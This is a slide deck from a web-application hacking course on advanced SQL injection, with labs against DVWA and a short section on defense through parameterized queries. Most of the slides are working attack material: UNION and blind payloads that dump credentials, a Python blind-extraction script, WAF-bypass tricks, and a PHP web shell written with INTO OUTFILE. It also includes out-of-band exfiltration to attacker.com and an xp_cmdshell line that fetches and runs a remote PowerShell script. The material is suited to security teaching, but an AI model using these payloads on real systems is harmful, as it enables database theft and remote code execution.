# Advanced SQL Injection

## Day 3: UNION Extraction, Blind Injection & Beyond

---

## Day 3 Overview

| Session | Topic |
|---------|-------|
| Morning Part 1 | UNION-based extraction deep dive |
| Morning Part 2 | Blind injection techniques |
| Afternoon Part 1 | sqlmap automation |
| Afternoon Part 2 | Bypassing filters, second-order SQLi |
| Late Afternoon | XSS introduction |

---

## SQL Injection Attack Tree

![sql_injection_attack_tree](svg/courses/security/web-application-hacking/12_advanced_sql_injection/sql_injection_attack_tree.svg)

---

## UNION-Based Extraction - Full Workflow

```misc
Step 1: Confirm injection
Step 2: Determine column count (ORDER BY)
Step 3: Find visible columns (UNION SELECT 1,2,3...)
Step 4: Extract DB version
Step 5: Enumerate databases
Step 6: Enumerate tables
Step 7: Enumerate columns
Step 8: Extract data
Step 9: Escalate (file read/write, OS command)
```

---

## MySQL Information Schema

```sql
-- The information_schema database contains metadata about ALL databases

-- List all databases
SELECT schema_name FROM information_schema.schemata;

-- List tables in a specific database
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'target_db';

-- List columns in a specific table
SELECT column_name, data_type FROM information_schema.columns
WHERE table_schema = 'target_db' AND table_name = 'users';

-- Get table row count
SELECT table_name, table_rows FROM information_schema.tables
WHERE table_schema = 'target_db';

-- List all user privileges
SELECT * FROM information_schema.user_privileges;
```

---

## PostgreSQL Metadata Queries

```sql
-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- List columns
SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 'users';

-- Current user
SELECT current_user;

-- PostgreSQL version
SELECT version();

-- List users and roles
SELECT usename, usesuper FROM pg_user;

-- Read files (superuser required)
SELECT pg_read_file('/etc/passwd');

-- Execute OS commands (via COPY or extensions)
CREATE TABLE cmd_output(result text);
COPY cmd_output FROM PROGRAM 'id';
SELECT result FROM cmd_output;
```

---

## MSSQL Metadata Queries

```sql
-- List databases
SELECT name FROM sys.databases;
-- or: SELECT name FROM master..sysdatabases;

-- List tables in current database
SELECT name FROM sys.tables;
-- or: SELECT name FROM sysobjects WHERE xtype='U';

-- List columns
SELECT name, TYPE_NAME(system_type_id)
FROM sys.columns WHERE object_id = OBJECT_ID('users');

-- Current user and privileges
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Execute OS commands (if xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## Oracle Metadata Queries

```sql
-- List tables (owned by current user)
SELECT table_name FROM user_tables;

-- List all tables (accessible)
SELECT owner, table_name FROM all_tables;

-- List columns
SELECT column_name FROM all_tab_columns
WHERE table_name = 'USERS';

-- Current user
SELECT user FROM dual;

-- Database version
SELECT banner FROM v$version WHERE ROWNUM = 1;

-- Oracle doesn't support LIMIT - use ROWNUM
SELECT * FROM (SELECT * FROM users) WHERE ROWNUM <= 10;

-- Oracle requires FROM clause - use dual
SELECT 1 FROM dual;
```

---

## Extracting Large Datasets

```sql
-- MySQL: GROUP_CONCAT (limited to 1024 chars by default)
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3
  FROM users--

-- Increase limit
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3
  FROM users--
  -- Session variable: SET group_concat_max_len = 1000000

-- Pagination with LIMIT
' UNION SELECT 1,username,password FROM users LIMIT 0,1-- (row 1)
' UNION SELECT 1,username,password FROM users LIMIT 1,1-- (row 2)
' UNION SELECT 1,username,password FROM users LIMIT 2,1-- (row 3)

-- MSSQL: TOP and OFFSET
' UNION SELECT TOP 1 username, password FROM users--
' UNION SELECT username, password FROM users
  ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
```

---

## Blind SQL Injection Techniques

![blind_sql_injection_techniques](svg/courses/security/web-application-hacking/12_advanced_sql_injection/blind_sql_injection_techniques.svg)

---

## Boolean Blind Injection - Systematic Approach

```sql
-- Step 1: Confirm boolean difference
id=1 AND 1=1  -> Normal page (TRUE)
id=1 AND 1=2  -> Empty/different page (FALSE)

-- Step 2: Extract data length
id=1 AND LENGTH((SELECT database()))=4  -> TRUE (DB name is 4 chars)

-- Step 3: Extract characters using binary search
-- Character 1:
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>109
  -> TRUE (char > 'm')
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>122
  -> FALSE (char <= 'z')
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>115
  -> FALSE (char <= 's')
-- ...narrow down to exact character

-- Automation with Python (pseudocode):
for position in range(1, length+1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if test(f"ASCII(SUBSTR(query,{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    result += chr(low)
```

---

## Blind Injection Automation Script

```python
import requests

url = "http://target.com/page"
cookies = {"PHPSESSID": "abc123", "security": "low"}

def inject(payload):
    params = {"id": payload, "Submit": "Submit"}
    r = requests.get(url, params=params, cookies=cookies)
    return "Surname" in r.text  # TRUE condition indicator

def extract_char(query, position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1 AND ASCII(SUBSTRING(({query}),{position},1))>{mid}"
        if inject(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract_string(query, length):
    return ''.join(extract_char(query, i) for i in range(1, length+1))

# Extract database name
db_name = extract_string("SELECT database()", 4)
print(f"Database: {db_name}")
```

---

## Time-Based Blind - Detailed Techniques

```sql
-- MySQL time-based
' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)--

-- Benchmark alternative (when SLEEP is blocked)
' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--

-- MSSQL time-based
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--

-- PostgreSQL time-based
'; SELECT CASE WHEN
  (SUBSTRING(current_database(),1,1)='p')
  THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- Oracle time-based
' AND CASE WHEN (SUBSTR(user,1,1)='S')
  THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 0 END=0--

-- Measurement: Normal response ~200ms
-- Injected delay: 3000ms+ confirms TRUE
```

---

## Out-of-Band SQL Injection

```sql
-- When in-band and blind don't work
-- Use DNS or HTTP requests from the database server

-- MySQL: DNS exfiltration via LOAD_FILE
SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT database()),
  '.attacker.com\\share'));
-- DNS query for: dvwa.attacker.com

-- MSSQL: DNS via xp_dirtree
EXEC master..xp_dirtree '\\attacker.com\share'

-- MSSQL: HTTP via OLE Automation
DECLARE @o int;
EXEC sp_OACreate 'MSXML2.XMLHTTP', @o OUT;
EXEC sp_OAMethod @o, 'open', NULL, 'GET',
  'http://attacker.com/?data=stolen', false;

-- Oracle: HTTP via UTL_HTTP
SELECT UTL_HTTP.REQUEST('http://attacker.com/?'||
  (SELECT user FROM dual)) FROM dual;
```

---

## sqlmap - Comprehensive Usage

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# Specify injection point
sqlmap -u "http://target.com/page?id=1" -p id --batch

# From Burp request file
sqlmap -r request.txt --batch

# POST data
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" -p username --batch

# Custom cookie/headers
sqlmap -u "http://target.com/page?id=1" \
  --cookie="PHPSESSID=abc123; security=low" --batch

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch
```

---

## sqlmap - Enumeration

```bash
# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D dvwa --tables --batch

# Enumerate columns in a table
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --columns --batch

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --dump --batch

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" \
  -D dvwa -T users -C username,password --dump --batch

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Search for specific column names
sqlmap -u "http://target.com/page?id=1" \
  --search -C password --batch
```

---

## sqlmap - Advanced Features

```bash
# OS shell (if privileges allow)
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Read files
sqlmap -u "http://target.com/page?id=1" \
  --file-read="/etc/passwd" --batch

# Write files
sqlmap -u "http://target.com/page?id=1" \
  --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Specify technique
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -u "http://target.com/page?id=1" --technique=BEU --batch

# Increase level and risk
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch
```

---

## sqlmap - WAF Bypass with Tamper Scripts

```bash
# List available tamper scripts
sqlmap --list-tampers

# Common tamper scripts
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment --batch
# Replaces spaces with /**/

# Chain multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase --batch

# Popular tamper scripts:
# space2comment    - space -> /**/
# between          - > -> NOT BETWEEN 0 AND
# randomcase       - RaNdOm CaSe
# charencode       - URL-encode characters
# equaltolike      - = -> LIKE
# space2hash       - space -> %23newline (MySQL)
# base64encode     - Base64 encode payload
```

---

## Bypassing SQL Injection Filters

```sql
-- Filter: Blocks 'OR'
-- Bypass: Case variation
' oR 1=1--
' OR 1=1--   (double-URL-encode: %256F%2552)

-- Filter: Blocks spaces
-- Bypass: Use comments or tabs
'/**/OR/**/1=1--
' OR    1=1--    (tab character)
'%09OR%091=1--   (URL-encoded tab)

-- Filter: Blocks 'SELECT'
-- Bypass:
SeLeCt       (case variation)
SEL%00ECT    (null byte injection)
/*!SELECT*/  (MySQL version comment)

-- Filter: Blocks quotes
-- Bypass: Use hex encoding
SELECT * FROM users WHERE name=0x61646d696e  (hex for 'admin')

-- Filter: Blocks 'UNION SELECT'
-- Bypass:
UNION ALL SELECT
UNION%0ASELECT    (newline)
UNION/**/SELECT
```

---

## Second-Order SQL Injection

```misc
First-order: Input is used immediately in a query
Second-order: Input is STORED, then used later in a different query

Example:
1. Register with username: admin'--
   INSERT INTO users(username) VALUES('admin''--')
   (Properly escaped for INSERT - stored safely)

2. Later, admin changes password - app queries by username:
   UPDATE users SET password='new_pass'
   WHERE username='admin'--'
   (Retrieved from DB, NOT escaped this time!)
   Result: Updates admin's password!

Detection:
- Harder to find with automated tools
- Requires understanding of data flow
- Input stored in one place, used in another
```

---

## SQL Injection in Different Contexts

```sql
-- In JSON APIs
POST /api/search
Content-Type: application/json
{"query": "test' OR 1=1--"}

-- In XML
<search>
  <term>test' OR 1=1--</term>
</search>

-- In HTTP headers (logged to DB)
User-Agent: Mozilla' OR 1=1--
X-Forwarded-For: 127.0.0.1' UNION SELECT 1,2,3--

-- In file names (uploaded and logged)
Filename: report' OR 1=1--.pdf

-- In email addresses during registration
Email: test@test.com' OR 1=1--
```

---

## Preventing SQL Injection

```python
# SOLUTION 1: Parameterized Queries (BEST)

# Python with psycopg2
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)

# Python with SQLAlchemy ORM
user = User.query.filter_by(username=username).first()

# Java with PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);

# PHP with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user");
$stmt->execute(['user' => $username]);

# Node.js with parameterized query
db.query("SELECT * FROM users WHERE username = $1", [username]);
```

---

## Defense Layers Against SQL Injection

![defense_layers_against_sql_injection](svg/courses/security/web-application-hacking/12_advanced_sql_injection/defense_layers_against_sql_injection.svg)

---

## SQL Injection to OS Command Execution

```sql
-- MySQL: Write a web shell
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>'
  INTO OUTFILE '/var/www/html/cmd.php'--
-- Then access: http://target.com/cmd.php?cmd=whoami

-- MySQL: Read sensitive files
' UNION SELECT 1,LOAD_FILE('/etc/passwd')--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php')--

-- MSSQL: Enable and use xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "IEX(IWR http://attacker/shell.ps1)"';--

-- PostgreSQL: Command execution
'; CREATE TABLE cmd(output text);
  COPY cmd FROM PROGRAM 'id';
  SELECT output FROM cmd;--

-- PostgreSQL: Read/Write files
'; COPY (SELECT '') TO '/var/www/html/shell.php';--
```

---

## Stored Procedure Injection

```sql
-- Even stored procedures can be vulnerable if they
-- use dynamic SQL internally

-- Vulnerable stored procedure (MSSQL):
CREATE PROCEDURE SearchProducts @term VARCHAR(100)
AS
  EXEC('SELECT * FROM products WHERE name LIKE ''%'
       + @term + '%''')
GO

-- Attack: @term = test'; EXEC xp_cmdshell 'whoami';--
-- Becomes: SELECT * FROM products WHERE name LIKE '%test';
--          EXEC xp_cmdshell 'whoami';--%'

-- SECURE stored procedure:
CREATE PROCEDURE SearchProducts @term VARCHAR(100)
AS
  SELECT * FROM products WHERE name LIKE '%' + @term + '%'
  -- Parameterized, no dynamic SQL
GO

-- OR use sp_executesql with parameters:
EXEC sp_executesql N'SELECT * FROM products WHERE name LIKE @t',
     N'@t VARCHAR(100)', @t = '%' + @term + '%'
```

---

## WAF Bypass Advanced Techniques

```sql
-- Technique 1: HTTP Parameter Pollution
-- Some WAFs check individual params, not combined
?id=1&id=UNION&id=SELECT&id=1,2,3

-- Technique 2: Chunked Transfer Encoding
-- Split payload across chunks to evade pattern matching
Transfer-Encoding: chunked
4\r\n
1 UN\r\n
5\r\n
ION S\r\n
6\r\n
ELECT\r\n

-- Technique 3: JSON/XML body injection
-- WAFs may not inspect non-form content types
{"id": "1 UNION SELECT 1,2,3"}

-- Technique 4: Unicode normalization
-- Some databases accept Unicode equivalents
SELE%EF%BC%A3T  (fullwidth C)

-- Technique 5: Comment-based obfuscation
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
-- MySQL version-specific comments execute on 5.0.0+
```

---

## ORM Injection

```python
# ORMs (Object-Relational Mappers) add abstraction
# but can still be vulnerable to injection

# Django ORM - Safe by default
User.objects.filter(username=user_input)  # Parameterized

# BUT - using .extra() or .raw() is dangerous:
User.objects.extra(where=["name='%s'" % user_input])  # VULNERABLE!
User.objects.raw("SELECT * FROM users WHERE name='%s'" % user_input)  # VULNERABLE!

# SQLAlchemy - Safe with query API
session.query(User).filter(User.name == user_input)  # Safe

# BUT text() without parameters is dangerous:
session.execute(text(f"SELECT * FROM users WHERE name='{user_input}'"))  # VULNERABLE!

# Safe text() usage:
session.execute(text("SELECT * FROM users WHERE name=:name"), {"name": user_input})

# ActiveRecord (Ruby/Rails) - Safe by default
User.where(name: user_input)  # Parameterized

# BUT string interpolation is dangerous:
User.where("name = '#{user_input}'")  # VULNERABLE!
```

---

## SQL Injection Impact Assessment

![sql_injection_impact_assessment](svg/courses/security/web-application-hacking/12_advanced_sql_injection/sql_injection_impact_assessment.svg)

---

## Lab: DVWA SQL Injection - All Levels

```misc
Low: No protection
  id=1' UNION SELECT user,password FROM users-- -

Medium: mysql_real_escape_string + numeric dropdown
  Change dropdown value in Burp
  id=1 UNION SELECT user,password FROM users

High: Different input page, LIMIT 1
  id=1' UNION SELECT user,password FROM users#

Impossible: Parameterized query (cannot exploit)
  Uses PDO prepared statements

Compare the source code at each level to understand
what makes the "Impossible" level actually secure.
```

---

## Lab: sqlmap Against DVWA

```bash
# Save a request from Burp as request.txt
# Then run:

sqlmap -r request.txt \
  --cookie="PHPSESSID=your_session; security=low" \
  --dbs --batch

sqlmap -r request.txt \
  --cookie="PHPSESSID=your_session; security=low" \
  -D dvwa --tables --batch

sqlmap -r request.txt \
  --cookie="PHPSESSID=your_session; security=low" \
  -D dvwa -T users --dump --batch

# Try cracking the dumped password hashes
# sqlmap will attempt this automatically
```

---

## Summary

- `UNION`-based injection extracts data directly through query results
- Blind injection (boolean and time-based) works without visible output
- Out-of-band techniques use DNS/HTTP for data exfiltration
- `sqlmap` automates detection and exploitation
- Tamper scripts bypass common WAF filters
- Second-order injection is harder to detect
- **Parameterized queries are the primary defense**
- Defense in depth: validation, least privilege, WAF, error handling

> Next: Cross-Site Scripting (XSS)
